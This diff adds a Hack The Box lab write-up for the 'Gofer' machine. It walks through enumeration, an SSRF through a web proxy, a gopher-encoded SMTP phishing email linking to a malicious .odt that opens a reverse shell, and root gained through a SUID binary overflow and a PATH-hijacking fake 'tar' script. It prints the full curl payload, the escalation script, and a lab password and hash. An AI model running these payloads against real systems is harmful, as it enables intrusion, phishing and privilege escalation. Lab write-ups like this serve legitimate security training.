@@ -1,0 +1,182 @@
+=================================================================================================
+													******** HTB - machines: Gofer ********
+==================================================================================================
+Firstly I eported the IP as an env variable and ran an 'nmap' port scan on all ports on the target 
+machine.
+
+** export IP=10.10.11.225
+** nmap -n -Pn -p- $IP --open
+
+Nmap scan report for 10.10.11.225
+Host is up (0.12s latency).
+
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+
+** nmap -n -Pn -p 80,22,139,445 -sC -sV $IP
+
+Nmap scan report for 10.10.11.225
+Host is up (0.11s latency).
+
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 aa:25:82:6e:b8:04:b6:a9:a9:5e:1a:91:f0:94:51:dd (RSA)
+|   256 18:21:ba:a7:dc:e4:4f:60:d7:81:03:9a:5d:c2:e5:96 (ECDSA)
+|_  256 a4:2d:0d:45:13:2a:9e:7f:86:7a:f6:f7:78:bc:42:d9 (ED25519)
+80/tcp  open  http        Apache httpd 2.4.56
+|_http-server-header: Apache/2.4.56 (Debian)
+|_http-title: Did not follow redirect to http://gofer.htb/
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+Service Info: Host: gofer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: -1s
+| smb2-time: 
+|   date: 2023-08-27T06:51:17
+|_  start_date: N/A
+|_nbstat: NetBIOS name: GOFER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+
+================================================================================================
+-- Host enumeration:
+====================
+OS: Linux Debian
+Web server tech: Apache 2.4.56
+Web app tech:
+
+S-1-22-1-1000 Unix User\jhudson (LocalUser)				Jocelyn Hudson Project Manager
+S-1-22-1-1001 Unix User\jdavis (Local User)
+S-1-22-1-1002 Unix User\tbuckley (Local User)
+S-1-22-1-1003 Unix User\ablake (Local User)				Amanda Blake Accountant
+
+-- Valid email address:
+jdavis@gofer.htb				Jeff Davis CEO
+tbuckley@gofer.htb			Tom Buckley CTO
+
+-- New sub-domain found: proxy.gofer.htb
+
+=================================================================================================
+-- Exploitation walkthrough:
+============================
+** enum4linux -a $IP
+** smbclient -L //10.10.11.225/shares -N
+** smbclient \\\\$IP\\shares 
+
+User Jocelyn likes to click links. Advised to use .odt format since it works well with libreoffice.
+
+User tom (CTO) is working on a web proxy. Advised to limit access.
+
+bcos of the mail in the smb share i did an mnap port scan for an SMTP service which tunred out to be
+filtered.
+
+** nmap -n -Pn -p 25 -sC -sV $IP
+
+Also because there was a mention of a web proxy, i did a subdomian enumeration with gobuster. This
+found the subdomain 'proxy.gofer.htb' which i added to the /etc/hosts file.
+
+** gobuster dns -o dns_lookup.txt -w /opt/SecLists/Discovery/DNS/shubs-subdomains.txt --domain gofer.htb -t 32
+
+Accessing this subdomain, I was promted to enter creds. On viewing on burp suite, i changed the http
+method from a GET to a POSt request.
+
+This method asked for a URL param, which i added and set a value to point to my local webserver and
+I got a hit on my local machine.
+
+** http://proxy.gofer.htb/index.php?url=http://10.10.14.208:4343/pass.txt
+
+Next is to exploit this SSRF vuln. Since we know user jocelyn clicks on links, and we were hinted to
+send a .odt file, I will craft a malicious .odt file that contains a rev shell to my machine.
+
+Next i will use the gopher protocol, to send a mail to user joyce since the SMTP server is hosted
+internally.
+
+I got the payload form the below hactrick website.
+
+** https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#gopher
+
+The mail that would be sent is seen below. I will host the malicious odt file on my web server and
+also set up a netcat listener on my machien t listen for the reverse shell to my machine when the odt
+file is opeed b user joycelyn
+
+gopher://2130706433:25/xHELO gofer.htb
+MAIL FROM:<banter@wemail.com>
+RCPT TO:<jhudson@gofer.htb>
+DATA
+From: Marakesh <banter@wemail.com>
+To: <jhudson@gofer.htb>
+Date: Sun, 14 Aug 2023 10:20:26 -0400
+Subject: info
+
+I need help with <a href="http://10.10.14.208:4343/mana.odt "> this</a>
+
+.
+QUIT
+ HTTP/1.1 
+
+The request was not going theough on burp, so I use the curl CLI tool instead as seen below:
+
+curl -X POST 'http://proxy.gofer.htb/index.php?url=gopher://2130706433:25/xHELO%2520gofer.htb%250AMAIL%2520FROM%253A%253Cbanter%2540wemail.com%253E%250ARCPT%2520TO%253A%253Cjhudson%2540gofer.htb%253E%250ADATA%250AFrom%253A%2520Marakesh%2520%253Cbanter%2540wemail.com%253E%250ATo%253A%2520%253Cjhudson%2540gofer.htb%253E%250ADate%253A%2520Sun%252C%252014%2520Aug%25202023%252010%253A20%253A26%2520-0400%250ASubject%253A%2520info%250A%250AI%2520need%2520help%2520with%2520%253Ca%2520href%253D%2522http%253A%252F%252F10.10.14.208%253A8000%252Fmana.odt%20%3E%2520this%253C%252Fa%253E%250A%250A%250A.%250AQUIT%250A%2520HTTP%252F1.1%'
+
+Once i gained a shell, i create a stable shell with python and got the user flag.
+
+During my post-exploitation phase, i didnt see anything useful so i decided to use psppy64 and 
+linpeas post-exploitation enum tools.
+
+With linepeas, I saw the user tom's hash in the /etc/apache2/.htpasswd file.
+
+** /etc/apache2/.htpasswd		=>		tbuckley:$apr1$YcZb9OIz$fRzQMx20VskXgmH65jjLh/
+
+With pspsy64, i got a curl command that tries to log the user tom buckley with his password base64
+encoded.
+
+** /usr/bin/curl http://proxy.gofer.htb/?url=http://gofer.htb --user tbuckley:ooP4dietie3o_hquaeti
+
+I then used this password to login via ssh and i got in. Using the find command i saw the notes
+binary which had the suid bit set.
+
+I needed to uderstand how the notes app worked and on using strings command, i could see that the
+username and notes files takes in 23 and 39 string length respectively.
+
+Also, if i deleted the username, the username field gets deleted but not the roles field. I could 
+then use the ntoes field to popultate the role field by using 24 A's folloed by the word 'admin'
+
+The note looks for the word 'admin' to backup the note. This backup feature calls the 'tat' tool.
+
+We will leverage this tar tool to escalate our priv to root by creating a malicious tar script, add 
+it to adire we have control over and edit the PATH env varible in bash.
+
+** nano /tmp/tar
+
+Contents of the malicious tar file is seen below:
+
+#!/bin/bash
+cp /bin/bash /tmp/bash
+chmod +s /tmp/bash
+
+Next i make it executabe and edit the PATH env variable as seen below:
+
+** chmod +x tar
+** export PATH=/tmp:$PATH
+
+The payload added to the notes is seen below. We first creae a username, delete ti, amd then adda 
+note using the payload seen below.
+
+** AAAAAAAAAAAAAAAAAAAAAAAAadmin
+
+Finally we backup our notes by selecting the number 8. This will copy the bash in to the tmp dir and
+add the SUID bit to it as seen in th etar file.
+
+Next we execute the below command and get the root flag
+
+** /tmp/bahs -p
+
+
+
